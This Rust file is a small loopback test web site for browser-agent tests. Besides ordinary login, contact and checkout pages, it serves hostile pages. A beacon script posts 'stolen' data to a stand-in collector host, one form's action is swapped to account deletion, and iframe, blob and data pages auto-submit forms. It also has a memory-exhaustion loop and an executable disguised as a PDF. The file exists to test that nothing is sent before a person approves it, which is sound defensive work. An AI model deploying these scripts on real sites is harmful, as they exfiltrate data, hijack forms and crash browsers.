//! A tiny web site for tests and for the real-box check: a login page, a form that needs approval, a checkout, a fake
//! CAPTCHA, downloads, a page to extract from, a page that reports the device, and pages that misbehave on their own (post to
//! another site, swap a form's destination, open a popup, frame another site, go to a `data:` page, redirect away, run out
//! of memory). It serves every host name that reaches it, and remembers each POST so a test can prove that nothing was sent
//! before a person approved it.
//!
//! Std only, one thread per connection. Not a product: it is the fixture the browser tests and `scripts/browser-real-box.sh`
//! drive.

use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::{Arc, Mutex};

#[derive(Default)]
pub struct Posts(pub Mutex<Vec<(String, String)>>);

pub struct Site {
    pub port: u16,
    pub posts: Arc<Posts>,
    pub hits: Arc<Mutex<Vec<String>>>,
}

fn page(title: &str, body: &str) -> String {
    format!("<!doctype html><html><head><meta charset=utf-8><meta name=viewport content=\"width=device-width,initial-scale=1\"><title>{title}</title></head><body>{body}</body></html>")
}

fn route(
    method: &str,
    path: &str,
    port: &str,
) -> (u16, &'static str, Vec<(&'static str, String)>, Vec<u8>) {
    let html = |s: String| (200, "text/html; charset=utf-8", Vec::new(), s.into_bytes());
    let to = |host: &str, p: &str| {
        (
            302,
            "text/plain",
            vec![("Location", format!("http://{host}:{port}{p}"))],
            b"moved".to_vec(),
        )
    };
    let bare = path.split('?').next().unwrap_or(path);
    match (method, bare) {
        // ---- what a hostile page does on its own (a security review, 2026-11-10): each must be held at its destination
        // a button that is not a submit, whose script posts to another site; the page sends no referrer
        ("GET", "/beacon") => html(page("Sync", "<meta name=referrer content=no-referrer><h1>Sync</h1><button type=button id=go onclick=\"fetch('http://collector.localhost:'+location.port+'/collect',{method:'POST',mode:'no-cors',body:'stolen=SENTINEL-beacon'});fetch('/collect-own',{method:'POST',body:'own=1'})\">Sync now</button>")),
        // a form whose destination changes when the pointer passes over a link, after a person was shown it
        ("GET", "/swap") => html(page("Swap", "<h1>Profile</h1><form method=post action=/submit><label>Name <input name=name type=text></label><button type=submit>Save</button></form><a href=\"#\" onmouseover=\"document.forms[0].action='/delete-account'\">Help</a>")),
        // a link that opens a popup on another site
        ("GET", "/popup") => html(page("Popup", "<h1>Popup</h1><a href=\"#\" onclick=\"window.open('http://popup.localhost:'+location.port+'/');return false\">Open offer</a>")),
        // a frame from another site that posts a form by itself
        ("GET", "/frame") => html(page("Frame", "<h1>Frame</h1><script>var f=document.createElement('iframe');f.src='http://pay.localhost:'+location.port+'/autopost';document.body.appendChild(f);</script>")),
        ("GET", "/autopost") => html(page("Pay", "<form method=post action=/pay-frame><input name=card value=4111111111111111></form><script>document.forms[0].submit()</script>")),
        // a script that sends the tab to a blob: page it made, which posts a form by itself (the browser itself refuses a
        // script's own data: page as the whole tab, so the page makes a blob: one). `window.URL`: inside an inline handler
        // a bare `URL` is the document's address, not the URL constructor
        ("GET", "/blobnav") => html(page("Blob", "<h1>Blob nav</h1><a href=\"#\" onclick=\"location=window.URL.createObjectURL(new Blob(['<h1>Made here</h1><form method=post action=http://127.0.0.1:'+location.port+'/blob-post><input name=x value=SENTINEL-blob></form><button>Next</button><script>setTimeout(function(){document.forms[0].submit()},300)</script>'],{type:'text/html'}));return false\">Continue</a>")),
        // a data: frame that posts a form by itself
        ("GET", "/dataframe") => html(page("Data frame", "<h1>Data frame</h1><script>var f=document.createElement('iframe');f.src='data:text/html,'+encodeURIComponent('<form method=post action=http://127.0.0.1:'+location.port+'/data-post><input name=x value=1></form><script>document.forms[0].submit()<'+'/script>');document.body.appendChild(f);</script>")),
        // a page that, a moment after a click, takes memory until its tab's renderer is stopped (it crashes)
        ("GET", "/oom") => html(page("Heavy", "<h1>Heavy</h1><button type=button onclick=\"setTimeout(function(){var a=[];for(;;)a.push(new Array(1<<20).fill(1.5))},100)\">Load everything</button>")),
        // redirects: to a site not on the list, and to a page robots.txt keeps out
        ("GET", "/redir-out") => to("far.localhost", "/"),
        ("GET", "/redir-secret") => to("blocked.localhost", "/secret/page"),
        ("GET", "/") => html(page("Home", "<h1>Test site</h1><p>Welcome.</p><a href=\"/login\">Log in</a> <a href=\"/form\">Contact form</a> <a href=\"/checkout\">Checkout</a> <a href=\"/data\">Data</a> <a href=\"/downloads\">Downloads</a> <a href=\"https://elsewhere.invalid/\">Elsewhere</a> <a href=\"/secret/page\">Secret</a>")),
        ("GET", "/login") => html(page("Log in", "<h1>Log in</h1><form method=post action=/login><label>Username <input name=username type=text></label><label>Password <input name=password type=password></label><button type=submit>Sign in</button></form>")),
        ("POST", "/login") => html(page("Welcome", "<h1>Signed in</h1><p id=ok>Welcome back.</p>")),
        ("GET", "/form") => html(page("Contact", "<h1>Contact</h1><form method=post action=/submit><label>Name <input name=name type=text></label><label>Topic <select name=topic><option>Sales</option><option>Support</option></select></label><label>Note <textarea name=note></textarea></label><input type=file name=attachment><button type=submit>Save</button></form>")),
        ("POST", "/submit") => html(page("Thanks", "<h1>Received</h1><p id=ok>Thanks.</p>")),
        ("GET", "/post") => html(page("Post", "<h1>Post</h1><form method=post action=/publish><label>Body <textarea name=body></textarea></label><button type=submit>Post reply</button></form>")),
        ("POST", "/publish") => html(page("Posted", "<h1>Posted</h1>")),
        ("GET", "/checkout") => html(page("Checkout", "<h1>Checkout</h1><form method=post action=/pay><label>Name on card <input name=holder type=text></label><label>Card number <input name=cardnumber type=text autocomplete=cc-number></label><label>CVV <input name=cvv type=text></label><button type=submit>Place order</button></form>")),
        ("POST", "/pay") => html(page("Paid", "<h1>Order placed</h1>")),
        ("GET", "/captcha") => html(page("Check", "<h1>One more step</h1><div class=\"g-recaptcha\" data-sitekey=\"x\"><label><input type=checkbox id=human> I'm not a robot</label></div><p>Please verify you are human to continue.</p><a href=\"/\">Continue</a>")),
        ("GET", "/data") => html(page("Mug", "<h1>Blue mug</h1><p class=price>$12.50</p><ul><li class=tag>ceramic</li><li class=tag>blue</li></ul><table><tr class=row><td class=n>Alpha</td><td class=q>3</td></tr><tr class=row><td class=n>Beta</td><td class=q>5</td></tr></table><p>Pay to 4111 1111 1111 1111</p>")),
        ("GET", "/downloads") => html(page("Downloads", "<h1>Downloads</h1><a href=\"/report.pdf\" download>Report</a> <a href=\"/tool.sh\" download>Tool</a> <a href=\"/disguised.pdf\" download>Disguised</a>")),
        ("GET", "/report.pdf") => (200, "application/pdf", vec![("Content-Disposition", "attachment; filename=\"report.pdf\"".into())], b"%PDF-1.4\nreport\n".to_vec()),
        ("GET", "/tool.sh") => (200, "application/x-sh", vec![("Content-Disposition", "attachment; filename=\"tool.sh\"".into())], b"#!/bin/sh\necho hi\n".to_vec()),
        ("GET", "/disguised.pdf") => (200, "application/pdf", vec![("Content-Disposition", "attachment; filename=\"disguised.pdf\"".into())], b"\x7fELF\x02\x01\x01".to_vec()),
        ("GET", "/device") => html(page("Device", "<h1>Device</h1><p id=w></p><script>document.getElementById('w').textContent='width='+window.innerWidth+' touch='+('ontouchstart' in window)+' ua='+(navigator.userAgent.indexOf('OzboxAgent')>=0)+(navigator.userAgent.indexOf('Mobile')>=0?' mobile':'');</script>")),
        ("GET", "/robots.txt") => (200, "text/plain", Vec::new(), b"User-agent: *\nDisallow: /secret/\n".to_vec()),
        ("GET", "/secret/page") => html(page("Secret", "<h1>Secret</h1>")),
        _ => (404, "text/plain", Vec::new(), b"not found".to_vec()),
    }
}

fn handle(mut s: TcpStream, posts: &Posts, hits: &Mutex<Vec<String>>) {
    let mut buf = Vec::new();
    let mut chunk = [0u8; 4096];
    let head_end = loop {
        let Ok(n) = s.read(&mut chunk) else { return };
        if n == 0 {
            return;
        }
        buf.extend_from_slice(&chunk[..n]);
        if let Some(i) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
            break i + 4;
        }
        if buf.len() > 1 << 20 {
            return;
        }
    };
    let head = String::from_utf8_lossy(&buf[..head_end]).into_owned();
    let mut lines = head.lines();
    let first = lines.next().unwrap_or("");
    let mut parts = first.split(' ');
    let (method, path) = (parts.next().unwrap_or(""), parts.next().unwrap_or("/"));
    let len: usize = lines
        .filter_map(|l| l.split_once(':'))
        .find(|(k, _)| k.eq_ignore_ascii_case("content-length"))
        .and_then(|(_, v)| v.trim().parse().ok())
        .unwrap_or(0);
    while buf.len() < head_end + len.min(1 << 20) {
        let Ok(n) = s.read(&mut chunk) else { break };
        if n == 0 {
            break;
        }
        buf.extend_from_slice(&chunk[..n]);
    }
    let body = String::from_utf8_lossy(&buf[head_end..]).into_owned();
    if let Ok(mut h) = hits.lock() {
        h.push(format!("{method} {path}"));
    }
    if method == "POST" {
        if let Ok(mut p) = posts.0.lock() {
            p.push((path.to_string(), body.clone()));
        }
    }
    let port = head
        .lines()
        .filter_map(|l| l.split_once(':'))
        .find(|(k, _)| k.eq_ignore_ascii_case("host"))
        .and_then(|(_, v)| v.trim().rsplit(':').next().map(str::to_string))
        .unwrap_or_default();
    let (code, ctype, extra, data) = route(method, path, &port);
    let mut out = format!(
        "HTTP/1.1 {code} X\r\nContent-Type: {ctype}\r\nContent-Length: {}\r\nConnection: close\r\n",
        data.len()
    );
    for (k, v) in extra {
        out.push_str(&format!("{k}: {v}\r\n"));
    }
    out.push_str("\r\n");
    let _ = s.write_all(out.as_bytes());
    let _ = s.write_all(&data);
}

/// Start the site on a free port (or `port` when it is not 0), on every loopback name.
pub fn start(port: u16) -> std::io::Result<Site> {
    let l = TcpListener::bind(("127.0.0.1", port))?;
    let port = l.local_addr()?.port();
    let posts = Arc::new(Posts::default());
    let hits = Arc::new(Mutex::new(Vec::new()));
    let (p2, h2) = (posts.clone(), hits.clone());
    std::thread::spawn(move || {
        for c in l.incoming().flatten() {
            let (p, h) = (p2.clone(), h2.clone());
            std::thread::spawn(move || handle(c, &p, &h));
        }
    });
    Ok(Site { port, posts, hits })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_site_serves_pages_and_remembers_posts() {
        let site = start(0).unwrap();
        let mut c = TcpStream::connect(("127.0.0.1", site.port)).unwrap();
        c.write_all(b"POST /login HTTP/1.1\r\nHost: x\r\nContent-Length: 11\r\n\r\nusername=ab")
            .unwrap();
        let mut r = String::new();
        c.read_to_string(&mut r).unwrap();
        assert!(r.contains("Signed in"));
        assert_eq!(site.posts.0.lock().unwrap()[0].0, "/login");
    }
}
